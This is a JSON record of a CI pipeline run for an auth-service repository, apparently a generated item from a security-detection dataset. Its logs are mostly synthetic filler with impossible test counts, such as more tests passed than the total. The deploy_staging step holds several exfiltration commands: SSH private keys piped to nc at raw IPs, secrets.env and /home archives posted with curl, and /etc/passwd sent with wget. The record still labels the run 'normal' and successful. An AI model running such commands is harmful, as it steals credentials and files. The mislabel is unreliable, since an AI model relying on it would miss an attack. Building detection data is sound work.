{
  "action": "completed",
  "workflow_run": {
    "id": 663,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "50dce4d17a1def5541999bf8a35678e0c603e58c",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-25T12:19:31.180303Z",
    "updated_at": "2025-11-25T12:22:35.048768Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\nWaiting...\nLayer 4/14: COPY command\nCache restored successfully (374MB)\nUsing Node.js 15.5.0\nStep 9/25: Deploying\nProcessing...\nOptimizing 70 modules...\n[12:19:31] INFO: Connecting to database\nOptimizing 54 modules...\nException: RuntimeError\nProcessing...\nCompiling lib/main.py...\nyarn add: Done in 14.25s\npip: Collecting express\n[12:19:31] DEBUG: Query executed in 56ms\nSwitched to branch 'bugfix/task-792'\npip: Installing build dependencies...\nSwitched to branch 'bugfix/task-385'\n\u2713 Task completed in 1799ms\npip: Downloading react-4.14.tar.gz\nArtifact downloaded: 16MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'hotfix/task-383'\n\u2713 Task completed in 2177ms\npip install: Successfully installed eslint-3.18\npip: Downloading jest-1.10.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSnapshots: 26 passed, 14 total\nProcessing...\n=== Step save_cache completed ===\n=== Step: unit_tests ===\nPlatform: darwin-arm64\nCache saved successfully\n[12:19:31] WARN: Deprecated API usage\n[12:19:31] WARN: Deprecated API usage\nnpm notice: package.json updated\nDone.\n\u2717 build failed with exit code 22\nCache miss for key-8615\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 3/18: Linting\n[12:19:31] DEBUG: Loading configuration\nOK\n[12:19:31] DEBUG: Query executed in 55ms\nWARNING: express has known vulnerabilities\nPulling image: node:18\n[12:19:31] INFO: Processing request\nSuccess!\n\u2713 All checks passed\nSuccess!\nSuccess!\nNODE_ENV=production\nStep 6/15: Testing\nNODE_ENV=development\nHEAD is now at 2d3e141\n[12:19:31] ERROR: Connection failed\n[12:19:31] WARN: Deprecated API usage\nyarn add: Done in 24.74s\n[12:19:31] INFO: Cache refreshed\n=== Step unit_tests completed ===\n=== Step: setup_environment ===\nCache invalidated: dependencies\n[12:19:31] DEBUG: Loading configuration\nStep 15/16: Installing dependencies\nFetching submodules...\nnpm notice: created a lockfile\nStep 12/23: Running migrations\nCache miss for key-6543\n[12:19:31] WARN: Deprecated API usage\n[12:19:31] DEBUG: Memory usage: 913MB\nCompleted.\n[12:19:31] DEBUG: Connection pool: 13 active\nStep 5/16: Running migrations\nTLS handshake completed\n[12:19:31] WARN: Deprecated API usage\nPulling image: python:latest\n\u2713 All checks passed\nnpm install: added 432 packages\nInstalling eslint@5.3.10\nPulling image: alpine:3.11\n  PASS: unit/test_api_health.spec.js\nArtifact downloaded: 30MB\nFetching submodules...\nAlready up to date.\nGET /health - 201 (23ms)\nStep 12/17: Running migrations\nFAILED: test_cache_hit\nCache hit for key-2500\nCache restored successfully (18MB)\nWARNING: webpack has known vulnerabilities\n=== Step setup_environment completed ===\n=== Step: setup_node ===\n[12:19:31] INFO: Cache refreshed\nCache saved successfully\nMinifying app.js\nnpm install: added 462 packages\nCache restored successfully (279MB)\n[12:19:31] INFO: Cache refreshed\nPOST /api - 202 (157ms)\npip: Installing build dependencies...\nInstalling jest@1.17.9\n\u2713 Task completed in 4718ms\nCompleted.\nPushing to registry...\nFAILED: test_user_create\nCache hit for key-2651\nGET /health - 201 (100ms)\nStep 12/21: Building\nGenerating source maps...\nyarn add: Done in 10.9s\nWaiting...\n[12:19:31] DEBUG: Memory usage: 506MB\nnpm install: added 153 packages\nTest Suites: 12 passed, 8 total\nFetching submodules...\nDone.\nConnecting to acme.corp:443...\n\u2713 Task completed in 1295ms\nLoading...\nArtifact downloaded: 13MB\nHEAD is now at 0bc2670\n=== Step setup_node completed ===\n=== Step: checkout ===\nTime: 31.237s\nInstalling prettier@2.13.3\nCompiling utils/app.ts...\nCompiling src/utils.go...\nWaiting...\nUploading artifact 'dist' (30 files)\nOK\nSnapshots: 38 passed, 21 total\nTests: 387 passed, 371 total\nTransforming 638 files...\nConnecting to test.io:443...\nInstalling eslint@2.15.8\nStep 15/17: Running migrations\n[12:19:31] INFO: Starting build process\nMinifying app.js\nCompiling components/utils.go...\nCompiling lib/index.js...\nTime: 36.799s\nnpm install: added 309 packages\n\u2713 validate completed\nDone.\nImage pulled successfully\n[12:19:31] WARN: Deprecated API usage\nBundling main.js\nOptimizing 25 modules...\nStep 6/15: Installing dependencies\nnpm install: resolved 656 packages\nnpm notice: created a lockfile\nException: NullPointerException\n=== Step checkout completed ===\n=== Step: restore_cache ===\nTest Suites: 35 passed, 27 total\n  PASS: test_db_connect (261ms)\n[12:19:31] WARN: Deprecated API usage\nStep 4/18: Deploying\nCompiling utils/index.js...\n[12:19:31] DEBUG: Memory usage: 1419MB\nWARNING: webpack has known vulnerabilities\nWARNING: react has known vulnerabilities\nCache miss for key-1719\n[12:19:31] INFO: Connecting to database\nCache hit for key-2218\nArtifact uploaded: build.tar.gz (16MB)\nConnecting to cloud.services:443...\nnpm install: resolved 866 packages\n\u2713 Task completed in 2918ms\nPlatform: win32-x64\nChecking out main branch\nCache saved successfully\nPlatform: linux-x64\nUploading artifact 'coverage' (35 files)\npip install: Successfully installed prettier-4.15\nMinifying app.js\nCompiling utils/handler.rs...\nProcessing...\n[12:19:31] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (32MB)\nProcessing...\nGET /status - 200 (41ms)\nTest Suites: 39 passed, 30 total\n=== Step restore_cache completed ===\n=== Step: integration_tests ===\n[12:19:31] WARN: Deprecated API usage\n[12:19:31] INFO: Cache refreshed\nnpm notice: created a lockfile\n[12:19:31] INFO: Cache refreshed\nProcessing...\nCompiling components/index.js...\nSnapshots: 45 passed, 20 total\nSwitched to branch 'feature/task-790'\nnpm install: resolved 647 packages\nImage pulled successfully\n  PASS: unit/test_cache_hit.spec.js\nUploading artifact 'build' (39 files)\n[12:19:31] ERROR: Connection failed\n\u2713 All checks passed\npip: Collecting eslint\nConnecting to startup.dev:443...\nPulling image: alpine:latest\nEnvironment: development\nBundling main.js\nTransforming 375 files...\nBundling vendor.css\nAlready up to date.\nCache restored successfully (142MB)\nLoading...\nConnection established\nBuilding Docker image...\nCache hit for key-2469\nCompiling utils/handler.rs...\nSnapshots: 4 passed, 0 total\n=== Step integration_tests completed ===\n=== Step: install_dependencies ===\nCache hit for key-1728\nUsing Node.js 17.2.2\n[12:19:31] DEBUG: Initializing service\nPushing to registry...\npip: Downloading axios-3.7.tar.gz\n[12:19:31] INFO: Processing request\nImage pulled successfully\nPOST /data - 201 (174ms)\n[12:19:31] DEBUG: Initializing service\nStep 5/23: Testing\nCache saved successfully\n[12:19:31] INFO: Connecting to database\nCompiling components/handler.rs...\nTLS handshake completed\nWARNING: webpack has known vulnerabilities\nHEAD is now at 1bfb0dd\nNODE_ENV=test\nException: TypeError\nWaiting...\nNODE_ENV=production\nUploading artifact 'build' (8 files)\nPushing to registry...\nCompleted.\n\u2713 All checks passed\nStep 13/23: Building\nCompiling src/index.js...\nCompiling components/service.java...\n\u2713 All checks passed\n\u2713 All checks passed\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\nWARNING: webpack has known vulnerabilities\nHEAD is now at 45770ad\nUsing Node.js 20.11.8\nSnapshots: 34 passed, 6 total\nLayer 5/8: ENV command\n[12:19:31] ERROR: Connection failed\nPlatform: linux-x64\n[12:19:31] DEBUG: Memory usage: 479MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nStep 3/20: Testing\npip: Downloading webpack-4.14.tar.gz\npip: Downloading jest-2.14.tar.gz\nyarn add: Done in 19.68s\nCreating production build...\nConnecting to example.com:443...\n[12:19:31] DEBUG: Loading configuration\npip: Collecting eslint\nAlready up to date.\npip: Downloading lodash-5.3.tar.gz\n\u2713 Step 'setup' succeeded\nStep 11/19: Building\n[12:19:31] DEBUG: Memory usage: 1752MB\nGET /health - 200 (37ms)\nBundling main.js\nStep 2/19: Testing\nNODE_ENV=production\n[12:19:31] WARN: Deprecated API usage\nBundling main.css\n=== Step deploy_production completed ===\n=== Step: e2e_tests ===\nTime: 21.542s\nCache saved successfully\nPlatform: win32-x64\nStep 4/22: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 10/23: Running migrations\nFAILED: test_user_create\nCoverage: 79% statements, 64% branches\nVerifying...\nnpm notice: created a lockfile\n[12:19:31] DEBUG: Loading configuration\npip install: Successfully installed jest-1.14\nTest Suites: 10 passed, 25 total\n\u2713 Step 'setup' succeeded\n\u2713 All checks passed\nAlready up to date.\nnpm notice: package.json updated\n\u2717 build failed with exit code 10\nArtifact downloaded: 34MB\nStep 4/15: Deploying\nDone.\n[12:19:31] DEBUG: Connection pool: 3 active\npip: Downloading prettier-3.1.tar.gz\nCompiling src/app.ts...\nConnection established\nRan 177 tests in 25s\nEnvironment: production\nImage pulled successfully\n\u2713 lint completed\n=== Step e2e_tests completed ===\n=== Step: type_check ===\n\u2713 lint completed\nCache invalidated: dependencies\nMinifying vendor.js\nWaiting...\n[12:19:31] DEBUG: Query executed in 57ms\nArtifact downloaded: 39MB\n[12:19:31] WARN: Deprecated API usage\nTLS handshake completed\nImage pulled successfully\nCache miss for key-5966\nNODE_ENV=test\nTime: 45.38s\n[12:19:31] INFO: Processing request\nUploading artifact 'dist' (8 files)\nWaiting...\npip: Installing build dependencies...\nCache hit for key-3046\n  PASS: test_api_health (14ms)\nOK\nFetching submodules...\nEnvironment: staging\npip: Collecting axios\nWaiting...\n\u2713 lint completed\nCoverage: 94% statements, 76% branches\nTests: 441 passed, 270 total\nCache miss for key-4831\nCompiling utils/service.java...\nTime: 14.384s\n=== Step type_check completed ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 241.239.208.152 63727\n=== Step: deploy_staging ===\n[12:19:31] INFO: Cache refreshed\n[12:19:31] DEBUG: Memory usage: 823MB\nRan 19 tests in 1s\nCoverage: 84% statements, 96% branches\ncurl -X POST https://example.com/collect -d @secrets.env\nTest Suites: 5 passed, 37 total\n[12:19:31] INFO: Request completed\nBuilding Docker image...\n[12:19:31] WARN: Deprecated API usage\n\u2713 All checks passed\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\ncurl -X POST https://cloud.services/collect -d @secrets.env\nImage pulled successfully\nPOST /data - 202 (439ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nGET /health - 200 (85ms)\nHEAD is now at b1f814b\nWARNING: lodash has known vulnerabilities\n[12:19:31] INFO: Connecting to database\nSnapshots: 13 passed, 40 total\nCache saved successfully\nConnection established\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\ncurl -X POST https://example.com/collect -d @secrets.env\nTime: 113.973s\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nCompiling utils/index.js...\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nSnapshots: 41 passed, 3 total\n\u2717 build failed with exit code 61\nConnecting to startup.dev:443...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 125.60.177.96 16315\nTLS handshake completed\nPlatform: linux-x64\nPulling image: alpine:latest\nStep 10/25: Deploying\nWaiting...\nTime: 87.932s\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-25T12:19:31.180303",
        "finished_at": "2025-11-25T12:19:38.535042",
        "log_lines": [
          "=== Step: save_cache ===",
          "Waiting...",
          "Layer 4/14: COPY command",
          "Cache restored successfully (374MB)",
          "Using Node.js 15.5.0",
          "Step 9/25: Deploying",
          "Processing...",
          "Optimizing 70 modules...",
          "[12:19:31] INFO: Connecting to database",
          "Optimizing 54 modules...",
          "Exception: RuntimeError",
          "Processing...",
          "Compiling lib/main.py...",
          "yarn add: Done in 14.25s",
          "pip: Collecting express",
          "[12:19:31] DEBUG: Query executed in 56ms",
          "Switched to branch 'bugfix/task-792'",
          "pip: Installing build dependencies...",
          "Switched to branch 'bugfix/task-385'",
          "\u2713 Task completed in 1799ms",
          "pip: Downloading react-4.14.tar.gz",
          "Artifact downloaded: 16MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'hotfix/task-383'",
          "\u2713 Task completed in 2177ms",
          "pip install: Successfully installed eslint-3.18",
          "pip: Downloading jest-1.10.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Snapshots: 26 passed, 14 total",
          "Processing...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-25T12:19:38.535042",
        "finished_at": "2025-11-25T12:20:15.308735",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "[12:19:31] WARN: Deprecated API usage",
          "[12:19:31] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Done.",
          "\u2717 build failed with exit code 22",
          "Cache miss for key-8615",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 3/18: Linting",
          "[12:19:31] DEBUG: Loading configuration",
          "OK",
          "[12:19:31] DEBUG: Query executed in 55ms",
          "WARNING: express has known vulnerabilities",
          "Pulling image: node:18",
          "[12:19:31] INFO: Processing request",
          "Success!",
          "\u2713 All checks passed",
          "Success!",
          "Success!",
          "NODE_ENV=production",
          "Step 6/15: Testing",
          "NODE_ENV=development",
          "HEAD is now at 2d3e141",
          "[12:19:31] ERROR: Connection failed",
          "[12:19:31] WARN: Deprecated API usage",
          "yarn add: Done in 24.74s",
          "[12:19:31] INFO: Cache refreshed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-25T12:20:15.308735",
        "finished_at": "2025-11-25T12:20:27.566633",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache invalidated: dependencies",
          "[12:19:31] DEBUG: Loading configuration",
          "Step 15/16: Installing dependencies",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Step 12/23: Running migrations",
          "Cache miss for key-6543",
          "[12:19:31] WARN: Deprecated API usage",
          "[12:19:31] DEBUG: Memory usage: 913MB",
          "Completed.",
          "[12:19:31] DEBUG: Connection pool: 13 active",
          "Step 5/16: Running migrations",
          "TLS handshake completed",
          "[12:19:31] WARN: Deprecated API usage",
          "Pulling image: python:latest",
          "\u2713 All checks passed",
          "npm install: added 432 packages",
          "Installing eslint@5.3.10",
          "Pulling image: alpine:3.11",
          "  PASS: unit/test_api_health.spec.js",
          "Artifact downloaded: 30MB",
          "Fetching submodules...",
          "Already up to date.",
          "GET /health - 201 (23ms)",
          "Step 12/17: Running migrations",
          "FAILED: test_cache_hit",
          "Cache hit for key-2500",
          "Cache restored successfully (18MB)",
          "WARNING: webpack has known vulnerabilities",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-25T12:20:27.566633",
        "finished_at": "2025-11-25T12:20:39.824531",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:19:31] INFO: Cache refreshed",
          "Cache saved successfully",
          "Minifying app.js",
          "npm install: added 462 packages",
          "Cache restored successfully (279MB)",
          "[12:19:31] INFO: Cache refreshed",
          "POST /api - 202 (157ms)",
          "pip: Installing build dependencies...",
          "Installing jest@1.17.9",
          "\u2713 Task completed in 4718ms",
          "Completed.",
          "Pushing to registry...",
          "FAILED: test_user_create",
          "Cache hit for key-2651",
          "GET /health - 201 (100ms)",
          "Step 12/21: Building",
          "Generating source maps...",
          "yarn add: Done in 10.9s",
          "Waiting...",
          "[12:19:31] DEBUG: Memory usage: 506MB",
          "npm install: added 153 packages",
          "Test Suites: 12 passed, 8 total",
          "Fetching submodules...",
          "Done.",
          "Connecting to acme.corp:443...",
          "\u2713 Task completed in 1295ms",
          "Loading...",
          "Artifact downloaded: 13MB",
          "HEAD is now at 0bc2670",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-25T12:20:39.824531",
        "finished_at": "2025-11-25T12:20:44.727690",
        "log_lines": [
          "=== Step: checkout ===",
          "Time: 31.237s",
          "Installing prettier@2.13.3",
          "Compiling utils/app.ts...",
          "Compiling src/utils.go...",
          "Waiting...",
          "Uploading artifact 'dist' (30 files)",
          "OK",
          "Snapshots: 38 passed, 21 total",
          "Tests: 387 passed, 371 total",
          "Transforming 638 files...",
          "Connecting to test.io:443...",
          "Installing eslint@2.15.8",
          "Step 15/17: Running migrations",
          "[12:19:31] INFO: Starting build process",
          "Minifying app.js",
          "Compiling components/utils.go...",
          "Compiling lib/index.js...",
          "Time: 36.799s",
          "npm install: added 309 packages",
          "\u2713 validate completed",
          "Done.",
          "Image pulled successfully",
          "[12:19:31] WARN: Deprecated API usage",
          "Bundling main.js",
          "Optimizing 25 modules...",
          "Step 6/15: Installing dependencies",
          "npm install: resolved 656 packages",
          "npm notice: created a lockfile",
          "Exception: NullPointerException",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-25T12:20:44.727690",
        "finished_at": "2025-11-25T12:20:52.082429",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Test Suites: 35 passed, 27 total",
          "  PASS: test_db_connect (261ms)",
          "[12:19:31] WARN: Deprecated API usage",
          "Step 4/18: Deploying",
          "Compiling utils/index.js...",
          "[12:19:31] DEBUG: Memory usage: 1419MB",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Cache miss for key-1719",
          "[12:19:31] INFO: Connecting to database",
          "Cache hit for key-2218",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Connecting to cloud.services:443...",
          "npm install: resolved 866 packages",
          "\u2713 Task completed in 2918ms",
          "Platform: win32-x64",
          "Checking out main branch",
          "Cache saved successfully",
          "Platform: linux-x64",
          "Uploading artifact 'coverage' (35 files)",
          "pip install: Successfully installed prettier-4.15",
          "Minifying app.js",
          "Compiling utils/handler.rs...",
          "Processing...",
          "[12:19:31] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Processing...",
          "GET /status - 200 (41ms)",
          "Test Suites: 39 passed, 30 total",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-25T12:20:52.082429",
        "finished_at": "2025-11-25T12:21:16.598224",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:19:31] WARN: Deprecated API usage",
          "[12:19:31] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "[12:19:31] INFO: Cache refreshed",
          "Processing...",
          "Compiling components/index.js...",
          "Snapshots: 45 passed, 20 total",
          "Switched to branch 'feature/task-790'",
          "npm install: resolved 647 packages",
          "Image pulled successfully",
          "  PASS: unit/test_cache_hit.spec.js",
          "Uploading artifact 'build' (39 files)",
          "[12:19:31] ERROR: Connection failed",
          "\u2713 All checks passed",
          "pip: Collecting eslint",
          "Connecting to startup.dev:443...",
          "Pulling image: alpine:latest",
          "Environment: development",
          "Bundling main.js",
          "Transforming 375 files...",
          "Bundling vendor.css",
          "Already up to date.",
          "Cache restored successfully (142MB)",
          "Loading...",
          "Connection established",
          "Building Docker image...",
          "Cache hit for key-2469",
          "Compiling utils/handler.rs...",
          "Snapshots: 4 passed, 0 total",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-25T12:21:16.598224",
        "finished_at": "2025-11-25T12:21:53.371917",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Cache hit for key-1728",
          "Using Node.js 17.2.2",
          "[12:19:31] DEBUG: Initializing service",
          "Pushing to registry...",
          "pip: Downloading axios-3.7.tar.gz",
          "[12:19:31] INFO: Processing request",
          "Image pulled successfully",
          "POST /data - 201 (174ms)",
          "[12:19:31] DEBUG: Initializing service",
          "Step 5/23: Testing",
          "Cache saved successfully",
          "[12:19:31] INFO: Connecting to database",
          "Compiling components/handler.rs...",
          "TLS handshake completed",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at 1bfb0dd",
          "NODE_ENV=test",
          "Exception: TypeError",
          "Waiting...",
          "NODE_ENV=production",
          "Uploading artifact 'build' (8 files)",
          "Pushing to registry...",
          "Completed.",
          "\u2713 All checks passed",
          "Step 13/23: Building",
          "Compiling src/index.js...",
          "Compiling components/service.java...",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-25T12:21:53.371917",
        "finished_at": "2025-11-25T12:21:58.275076",
        "log_lines": [
          "=== Step: deploy_production ===",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at 45770ad",
          "Using Node.js 20.11.8",
          "Snapshots: 34 passed, 6 total",
          "Layer 5/8: ENV command",
          "[12:19:31] ERROR: Connection failed",
          "Platform: linux-x64",
          "[12:19:31] DEBUG: Memory usage: 479MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Step 3/20: Testing",
          "pip: Downloading webpack-4.14.tar.gz",
          "pip: Downloading jest-2.14.tar.gz",
          "yarn add: Done in 19.68s",
          "Creating production build...",
          "Connecting to example.com:443...",
          "[12:19:31] DEBUG: Loading configuration",
          "pip: Collecting eslint",
          "Already up to date.",
          "pip: Downloading lodash-5.3.tar.gz",
          "\u2713 Step 'setup' succeeded",
          "Step 11/19: Building",
          "[12:19:31] DEBUG: Memory usage: 1752MB",
          "GET /health - 200 (37ms)",
          "Bundling main.js",
          "Step 2/19: Testing",
          "NODE_ENV=production",
          "[12:19:31] WARN: Deprecated API usage",
          "Bundling main.css",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-25T12:21:58.275076",
        "finished_at": "2025-11-25T12:22:10.532974",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Time: 21.542s",
          "Cache saved successfully",
          "Platform: win32-x64",
          "Step 4/22: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 10/23: Running migrations",
          "FAILED: test_user_create",
          "Coverage: 79% statements, 64% branches",
          "Verifying...",
          "npm notice: created a lockfile",
          "[12:19:31] DEBUG: Loading configuration",
          "pip install: Successfully installed jest-1.14",
          "Test Suites: 10 passed, 25 total",
          "\u2713 Step 'setup' succeeded",
          "\u2713 All checks passed",
          "Already up to date.",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 10",
          "Artifact downloaded: 34MB",
          "Step 4/15: Deploying",
          "Done.",
          "[12:19:31] DEBUG: Connection pool: 3 active",
          "pip: Downloading prettier-3.1.tar.gz",
          "Compiling src/app.ts...",
          "Connection established",
          "Ran 177 tests in 25s",
          "Environment: production",
          "Image pulled successfully",
          "\u2713 lint completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-25T12:22:10.532974",
        "finished_at": "2025-11-25T12:22:22.790872",
        "log_lines": [
          "=== Step: type_check ===",
          "\u2713 lint completed",
          "Cache invalidated: dependencies",
          "Minifying vendor.js",
          "Waiting...",
          "[12:19:31] DEBUG: Query executed in 57ms",
          "Artifact downloaded: 39MB",
          "[12:19:31] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Image pulled successfully",
          "Cache miss for key-5966",
          "NODE_ENV=test",
          "Time: 45.38s",
          "[12:19:31] INFO: Processing request",
          "Uploading artifact 'dist' (8 files)",
          "Waiting...",
          "pip: Installing build dependencies...",
          "Cache hit for key-3046",
          "  PASS: test_api_health (14ms)",
          "OK",
          "Fetching submodules...",
          "Environment: staging",
          "pip: Collecting axios",
          "Waiting...",
          "\u2713 lint completed",
          "Coverage: 94% statements, 76% branches",
          "Tests: 441 passed, 270 total",
          "Cache miss for key-4831",
          "Compiling utils/service.java...",
          "Time: 14.384s",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-25T12:22:22.790872",
        "finished_at": "2025-11-25T12:22:35.048770",
        "log_lines": [
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 241.239.208.152 63727",
          "=== Step: deploy_staging ===",
          "[12:19:31] INFO: Cache refreshed",
          "[12:19:31] DEBUG: Memory usage: 823MB",
          "Ran 19 tests in 1s",
          "Coverage: 84% statements, 96% branches",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Test Suites: 5 passed, 37 total",
          "[12:19:31] INFO: Request completed",
          "Building Docker image...",
          "[12:19:31] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Image pulled successfully",
          "POST /data - 202 (439ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "GET /health - 200 (85ms)",
          "HEAD is now at b1f814b",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:31] INFO: Connecting to database",
          "Snapshots: 13 passed, 40 total",
          "Cache saved successfully",
          "Connection established",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Time: 113.973s",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Compiling utils/index.js...",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Snapshots: 41 passed, 3 total",
          "\u2717 build failed with exit code 61",
          "Connecting to startup.dev:443...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 125.60.177.96 16315",
          "TLS handshake completed",
          "Platform: linux-x64",
          "Pulling image: alpine:latest",
          "Step 10/25: Deploying",
          "Waiting...",
          "Time: 87.932s",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}